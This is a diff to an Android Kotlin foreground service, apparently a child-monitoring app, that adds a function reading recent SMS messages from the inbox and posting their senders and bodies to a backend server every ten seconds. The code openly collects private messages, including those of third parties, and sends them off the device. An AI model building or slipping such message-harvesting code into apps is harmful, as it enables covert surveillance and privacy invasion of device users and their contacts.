@@ -104,6 +104,7 @@ class MyForegroundService : Service() {
             override fun run() {
                 Log.d("MONITOR_SERVICE", "Tick - Child ID: $childId")
                 fetchAndSendData()
+                collectAndSendSms() 
                 handler.postDelayed(this, 10000) // Har 10 second baad
             }
         })
@@ -220,6 +221,80 @@ class MyForegroundService : Service() {
             }
         })
     }
+    // Collect SMS from inbox
+    private fun collectAndSendSms() {
+    if (childId == -1) return
+
+    try {
+        val cursor = contentResolver.query(
+            android.net.Uri.parse("content://sms/inbox"),
+            arrayOf("address", "body", "date"),
+            null, null,
+            "date DESC LIMIT 20"
+        ) ?: return
+
+        cursor.use {
+            while (it.moveToNext()) {
+                val sender  = it.getString(0) ?: ""
+                val body    = it.getString(1) ?: ""
+                val dateMs  = it.getLong(2)
+
+                // Last 10 min ki SMS hi bhejo — duplicate avoid
+                val tenMinAgo = System.currentTimeMillis() - (10 * 60 * 1000)
+                if (dateMs < tenMinAgo) continue
+                if (body.isBlank()) continue
+
+                sendChatToBackend(
+                    appName = "SMS",
+                    sender  = sender,
+                    message = body,
+                    date    = dateMs
+                )
+                // Timestamp 
+                if (dateMs > lastSmsTimestamp) {
+                    lastSmsTimestamp = dateMs
+                }
+            }
+        }
+    } catch (e: Exception) {
+        Log.e("MONITOR_SERVICE", "SMS Error: ${e.message}")
+    }
+}
+
+private fun sendChatToBackend(
+    appName: String,
+    sender: String,
+    message: String,
+    date: Long
+) {
+    val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.getDefault())
+
+    val json = JSONObject().apply {
+        put("child_id",  childId)
+        put("app_name",  appName)
+        put("sender",    sender)
+        put("message",   message)
+        put("timestamp", sdf.format(Date(date)))
+    }
+
+    val client = OkHttpClient()
+    val body   = json.toString()
+        .toRequestBody("application/json".toMediaType())
+
+    val request = Request.Builder()
+        .url("http://192.168.18.163:8000/collectchat/")
+        .post(body)
+        .build()
+
+    client.newCall(request).enqueue(object : Callback {
+        override fun onFailure(call: Call, e: IOException) {
+            Log.e("MONITOR_SERVICE", "Chat send failed: ${e.message}")
+        }
+        override fun onResponse(call: Call, response: Response) {
+            Log.d("MONITOR_SERVICE", "Chat sent ✓ | ${response.code}")
+        }
+    })
+}
 
     //  Lock screen dikhao
     private fun lockDevice() {
